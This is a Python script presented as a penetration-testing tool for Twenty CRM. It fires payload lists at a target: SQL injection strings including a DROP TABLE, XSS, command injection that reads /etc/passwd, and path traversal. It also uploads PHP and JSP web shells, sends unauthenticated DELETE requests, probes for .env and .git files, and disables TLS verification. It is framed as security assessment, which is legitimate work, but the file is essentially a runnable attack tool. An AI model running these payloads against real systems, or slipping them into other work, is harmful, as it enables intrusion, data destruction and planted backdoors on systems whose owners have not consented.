#!/usr/bin/env python3
"""
Twenty CRM Security Assessment Tool
Comprehensive penetration testing script for Twenty CRM deployment
"""

import requests
import json
import time
import sys
import argparse
import urllib.parse
import re
import os
from datetime import datetime
try:
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        pass

import concurrent.futures
from typing import Dict, List, Optional, Tuple

class TwentyCRMPenTest:
    def __init__(self, base_url: str, username: str = None, password: str = None):
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.results = []
        self.authenticated = False
        self.auth_token = None
        
        # Common payloads for testing
        self.sql_payloads = [
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' UNION SELECT NULL --",
            "'; DROP TABLE users; --",
            "' OR 1=1 LIMIT 1 --",
            "admin'--",
            "admin' #",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1--",
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "&& whoami",
            "| cat /etc/passwd",
            "; cat /etc/passwd",
            "&& cat /etc/passwd",
            "| whoami",
            "; whoami",
            "&& ls -la",
            "| ls -la",
            "; id",
            "&& id",
            "| id",
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]

    def log_result(self, test_name: str, status: str, details: str, severity: str = "info"):
        """Log test result"""
        result = {
            'timestamp': datetime.now().isoformat(),
            'test_name': test_name,
            'status': status,
            'details': details,
            'severity': severity
        }
        self.results.append(result)
        print(f"[{severity.upper()}] {test_name}: {status}")
        if details:
            print(f"    Details: {details}")
        print()

    def make_request(self, method: str, endpoint: str, **kwargs) -> requests.Response:
        """Make HTTP request with error handling"""
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.session.request(method, url, timeout=10, **kwargs)
            return response
        except requests.exceptions.RequestException as e:
            self.log_result(f"Request Error", "FAILED", f"Error making request to {url}: {str(e)}", "high")
            return None

    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        print("\n=== Information Disclosure Tests ===")
        
        # Test common sensitive files
        sensitive_files = [
            "/.env",
            "/config.json",
            "/package.json",
            "/docker-compose.yml",
            "/README.md",
            "/robots.txt",
            "/sitemap.xml",
            "/wp-config.php",
            "/web.config",
            "/application.properties",
            "/config/database.yml",
            "/.git/config",
            "/.svn/entries",
            "/backup.sql",
            "/dump.sql",
            "/error.log",
            "/access.log",
        ]
        
        for file in sensitive_files:
            response = self.make_request('GET', file)
            if response and response.status_code == 200:
                self.log_result(
                    f"Information Disclosure - {file}",
                    "VULNERABLE",
                    f"Sensitive file accessible: {file}",
                    "high"
                )
            elif response and response.status_code in [403, 401]:
                self.log_result(
                    f"Information Disclosure - {file}",
                    "PROTECTED",
                    f"File protected but exists: {file}",
                    "medium"
                )

    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        print("\n=== Directory Traversal Tests ===")
        
        # Test common file endpoints
        endpoints = [
            "/api/v1/files/",
            "/download/",
            "/file/",
            "/attachment/",
            "/export/",
            "/import/",
        ]
        
        for endpoint in endpoints:
            for payload in self.path_traversal_payloads:
                test_url = f"{endpoint}{payload}"
                response = self.make_request('GET', test_url)
                if response and response.status_code == 200:
                    if "root:" in response.text or "administrator" in response.text.lower():
                        self.log_result(
                            f"Directory Traversal - {endpoint}",
                            "VULNERABLE",
                            f"Path traversal successful with payload: {payload}",
                            "high"
                        )
                        break

    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        print("\n=== Authentication Bypass Tests ===")
        
        # Test SQL injection in login
        login_endpoint = "/auth/login"
        
        for payload in self.sql_payloads:
            data = {
                'email': payload,
                'password': 'test123'
            }
            response = self.make_request('POST', login_endpoint, json=data)
            if response:
                if response.status_code == 200 and 'token' in response.text:
                    self.log_result(
                        "Authentication Bypass - SQL Injection",
                        "VULNERABLE",
                        f"SQL injection successful in login with payload: {payload}",
                        "critical"
                    )
                    break
                elif response.status_code == 500:
                    self.log_result(
                        "Authentication Bypass - SQL Injection",
                        "POSSIBLE",
                        f"Server error with payload: {payload} - potential SQL injection",
                        "high"
                    )

    def test_authorization_bypass(self):
        """Test for authorization bypass vulnerabilities"""
        print("\n=== Authorization Bypass Tests ===")
        
        # Test admin endpoints without authentication
        admin_endpoints = [
            "/admin",
            "/admin/users",
            "/admin/settings",
            "/admin/integrations",
            "/admin/webhooks",
            "/api/v1/admin/users",
            "/api/v1/admin/settings",
        ]
        
        for endpoint in admin_endpoints:
            response = self.make_request('GET', endpoint)
            if response:
                if response.status_code == 200:
                    self.log_result(
                        f"Authorization Bypass - {endpoint}",
                        "VULNERABLE",
                        f"Admin endpoint accessible without authentication: {endpoint}",
                        "critical"
                    )
                elif response.status_code == 403:
                    self.log_result(
                        f"Authorization Bypass - {endpoint}",
                        "PROTECTED",
                        f"Admin endpoint properly protected: {endpoint}",
                        "info"
                    )

    def test_input_validation(self):
        """Test for input validation vulnerabilities"""
        print("\n=== Input Validation Tests ===")
        
        # Test XSS in various endpoints
        endpoints_with_params = [
            ("/api/v1/users", {"name": "TEST_PAYLOAD"}),
            ("/api/v1/companies", {"name": "TEST_PAYLOAD"}),
            ("/api/v1/deals", {"title": "TEST_PAYLOAD"}),
            ("/api/v1/contacts", {"firstName": "TEST_PAYLOAD"}),
            ("/search", {"query": "TEST_PAYLOAD"}),
        ]
        
        for endpoint, params in endpoints_with_params:
            for payload in self.xss_payloads:
                test_params = {k: v.replace("TEST_PAYLOAD", payload) for k, v in params.items()}
                
                # Test GET request
                response = self.make_request('GET', endpoint, params=test_params)
                if response and payload in response.text:
                    self.log_result(
                        f"XSS Vulnerability - {endpoint}",
                        "VULNERABLE",
                        f"XSS payload reflected in response: {payload}",
                        "high"
                    )
                
                # Test POST request
                response = self.make_request('POST', endpoint, json=test_params)
                if response and payload in response.text:
                    self.log_result(
                        f"XSS Vulnerability - {endpoint}",
                        "VULNERABLE",
                        f"XSS payload reflected in POST response: {payload}",
                        "high"
                    )

    def test_command_injection(self):
        """Test for command injection vulnerabilities"""
        print("\n=== Command Injection Tests ===")
        
        # Test endpoints that might process system commands
        endpoints = [
            "/api/v1/export",
            "/api/v1/import",
            "/api/v1/backup",
            "/api/v1/webhooks",
            "/api/v1/integrations",
        ]
        
        for endpoint in endpoints:
            for payload in self.command_injection_payloads:
                data = {
                    'command': payload,
                    'file': payload,
                    'path': payload,
                    'url': payload
                }
                
                response = self.make_request('POST', endpoint, json=data)
                if response and any(indicator in response.text for indicator in ['root:', 'uid=', 'gid=']):
                    self.log_result(
                        f"Command Injection - {endpoint}",
                        "VULNERABLE",
                        f"Command injection successful with payload: {payload}",
                        "critical"
                    )

    def test_session_management(self):
        """Test session management vulnerabilities"""
        print("\n=== Session Management Tests ===")
        
        # Test session fixation
        if self.authenticate():
            original_session = self.session.cookies.get('session')
            if original_session:
                # Test if session is properly invalidated on logout
                self.make_request('POST', '/auth/logout')
                response = self.make_request('GET', '/api/v1/users')
                if response and response.status_code == 200:
                    self.log_result(
                        "Session Management - Logout",
                        "VULNERABLE",
                        "Session not properly invalidated on logout",
                        "high"
                    )
                else:
                    self.log_result(
                        "Session Management - Logout",
                        "SECURE",
                        "Session properly invalidated on logout",
                        "info"
                    )

    def test_file_upload(self):
        """Test file upload vulnerabilities"""
        print("\n=== File Upload Tests ===")
        
        upload_endpoints = [
            "/api/v1/files/upload",
            "/api/v1/attachments",
            "/upload",
        ]
        
        # Test malicious file uploads
        malicious_files = [
            ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('test.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
            ('test.html', '<script>alert("XSS")</script>', 'text/html'),
            ('test.svg', '<svg onload=alert("XSS")>', 'image/svg+xml'),
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, mimetype in malicious_files:
                files = {'file': (filename, content, mimetype)}
                response = self.make_request('POST', endpoint, files=files)
                if response and response.status_code == 200:
                    self.log_result(
                        f"File Upload - {endpoint}",
                        "VULNERABLE",
                        f"Malicious file upload successful: {filename}",
                        "high"
                    )

    def test_api_security(self):
        """Test API security vulnerabilities"""
        print("\n=== API Security Tests ===")
        
        # Test API endpoints without authentication
        api_endpoints = [
            "/api/v1/users",
            "/api/v1/companies",
            "/api/v1/deals",
            "/api/v1/contacts",
            "/api/v1/activities",
            "/api/v1/webhooks",
            "/api/v1/integrations",
        ]
        
        for endpoint in api_endpoints:
            # Test GET request
            response = self.make_request('GET', endpoint)
            if response and response.status_code == 200:
                self.log_result(
                    f"API Security - {endpoint}",
                    "VULNERABLE",
                    f"API endpoint accessible without authentication: {endpoint}",
                    "high"
                )
            
            # Test DELETE request
            response = self.make_request('DELETE', endpoint + '/1')
            if response and response.status_code == 200:
                self.log_result(
                    f"API Security - {endpoint}",
                    "VULNERABLE",
                    f"DELETE operation allowed without authentication: {endpoint}",
                    "critical"
                )

    def test_csrf(self):
        """Test for CSRF vulnerabilities"""
        print("\n=== CSRF Tests ===")
        
        if self.authenticate():
            # Test if CSRF tokens are required
            csrf_endpoints = [
                ("/api/v1/users", "POST"),
                ("/api/v1/companies", "POST"),
                ("/api/v1/deals", "POST"),
                ("/auth/logout", "POST"),
            ]
            
            for endpoint, method in csrf_endpoints:
                # Remove any CSRF headers
                headers = {k: v for k, v in self.session.headers.items() if 'csrf' not in k.lower()}
                
                if method == "POST":
                    response = self.make_request('POST', endpoint, json={'test': 'data'}, headers=headers)
                else:
                    response = self.make_request(method, endpoint, headers=headers)
                
                if response and response.status_code == 200:
                    self.log_result(
                        f"CSRF - {endpoint}",
                        "VULNERABLE",
                        f"CSRF protection not implemented for {endpoint}",
                        "high"
                    )

    def test_rate_limiting(self):
        """Test rate limiting"""
        print("\n=== Rate Limiting Tests ===")
        
        # Test login rate limiting
        login_endpoint = "/auth/login"
        
        for i in range(20):  # Try 20 requests quickly
            data = {'email': 'test@example.com', 'password': 'wrongpassword'}
            response = self.make_request('POST', login_endpoint, json=data)
            if response and response.status_code == 429:
                self.log_result(
                    "Rate Limiting - Login",
                    "PROTECTED",
                    f"Rate limiting active after {i+1} requests",
                    "info"
                )
                break
            time.sleep(0.1)  # Small delay between requests
        else:
            self.log_result(
                "Rate Limiting - Login",
                "VULNERABLE",
                "No rate limiting detected on login endpoint",
                "medium"
            )

    def test_security_headers(self):
        """Test security headers"""
        print("\n=== Security Headers Tests ===")
        
        response = self.make_request('GET', '/')
        if response:
            headers = response.headers
            
            # Check for security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=',
                'Content-Security-Policy': 'default-src',
                'Referrer-Policy': 'strict-origin-when-cross-origin'
            }
            
            for header, expected in security_headers.items():
                if header in headers:
                    if isinstance(expected, list):
                        if any(exp in headers[header] for exp in expected):
                            self.log_result(
                                f"Security Headers - {header}",
                                "PRESENT",
                                f"Header present: {header}",
                                "info"
                            )
                        else:
                            self.log_result(
                                f"Security Headers - {header}",
                                "MISCONFIGURED",
                                f"Header present but misconfigured: {header}",
                                "medium"
                            )
                    else:
                        if expected in headers[header]:
                            self.log_result(
                                f"Security Headers - {header}",
                                "PRESENT",
                                f"Header present: {header}",
                                "info"
                            )
                        else:
                            self.log_result(
                                f"Security Headers - {header}",
                                "MISCONFIGURED",
                                f"Header present but misconfigured: {header}",
                                "medium"
                            )
                else:
                    self.log_result(
                        f"Security Headers - {header}",
                        "MISSING",
                        f"Security header missing: {header}",
                        "medium"
                    )

    def authenticate(self) -> bool:
        """Authenticate with the application"""
        if not self.username or not self.password:
            return False
        
        login_data = {
            'email': self.username,
            'password': self.password
        }
        
        response = self.make_request('POST', '/auth/login', json=login_data)
        if response and response.status_code == 200:
            try:
                data = response.json()
                if 'token' in data:
                    self.auth_token = data['token']
                    self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
                    self.authenticated = True
                    return True
            except:
                pass
        
        return False

    def run_all_tests(self):
        """Run all penetration tests"""
        print(f"\n{'='*60}")
        print(f"Twenty CRM Security Assessment")
        print(f"Target: {self.base_url}")
        print(f"Started: {datetime.now()}")
        print(f"{'='*60}")
        
        # Run tests
        self.test_information_disclosure()
        self.test_directory_traversal()
        self.test_authentication_bypass()
        self.test_authorization_bypass()
        self.test_input_validation()
        self.test_command_injection()
        self.test_session_management()
        self.test_file_upload()
        self.test_api_security()
        self.test_csrf()
        self.test_rate_limiting()
        self.test_security_headers()
        
        # Generate report
        self.generate_report()

    def generate_report(self):
        """Generate security assessment report"""
        print(f"\n{'='*60}")
        print("SECURITY ASSESSMENT REPORT")
        print(f"{'='*60}")
        
        # Count vulnerabilities by severity
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for result in self.results:
            severity = result['severity']
            if result['status'] in ['VULNERABLE', 'MISSING', 'MISCONFIGURED']:
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        print(f"Total Issues Found: {sum(severity_counts.values())}")
        print(f"Critical: {severity_counts['critical']}")
        print(f"High: {severity_counts['high']}")
        print(f"Medium: {severity_counts['medium']}")
        print(f"Low: {severity_counts['low']}")
        print(f"Info: {severity_counts['info']}")
        
        # Save detailed report
        report_file = f"twenty_crm_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\nDetailed report saved to: {report_file}")
        
        # Critical and High severity issues
        critical_high = [r for r in self.results if r['severity'] in ['critical', 'high'] and r['status'] in ['VULNERABLE', 'MISSING', 'MISCONFIGURED']]
        
        if critical_high:
            print(f"\nCRITICAL AND HIGH SEVERITY ISSUES:")
            print(f"{'='*60}")
            for issue in critical_high:
                print(f"[{issue['severity'].upper()}] {issue['test_name']}")
                print(f"Status: {issue['status']}")
                print(f"Details: {issue['details']}")
                print(f"Timestamp: {issue['timestamp']}")
                print("-" * 40)


def main():
    parser = argparse.ArgumentParser(description='Twenty CRM Security Assessment Tool')
    parser.add_argument('url', help='Target URL (e.g., https://twenty-crm.example.com)')
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-t', '--test', choices=['all', 'auth', 'input', 'api', 'headers'], 
                       default='all', help='Type of test to run')
    
    args = parser.parse_args()
    
    # Initialize penetration tester
    pentester = TwentyCRMPenTest(args.url, args.username, args.password)
    
    # Run tests based on selection
    if args.test == 'all':
        pentester.run_all_tests()
    elif args.test == 'auth':
        pentester.test_authentication_bypass()
        pentester.test_authorization_bypass()
        pentester.test_session_management()
    elif args.test == 'input':
        pentester.test_input_validation()
        pentester.test_command_injection()
        pentester.test_directory_traversal()
    elif args.test == 'api':
        pentester.test_api_security()
        pentester.test_csrf()
        pentester.test_rate_limiting()
    elif args.test == 'headers':
        pentester.test_security_headers()
    
    pentester.generate_report()


if __name__ == "__main__":
    main() 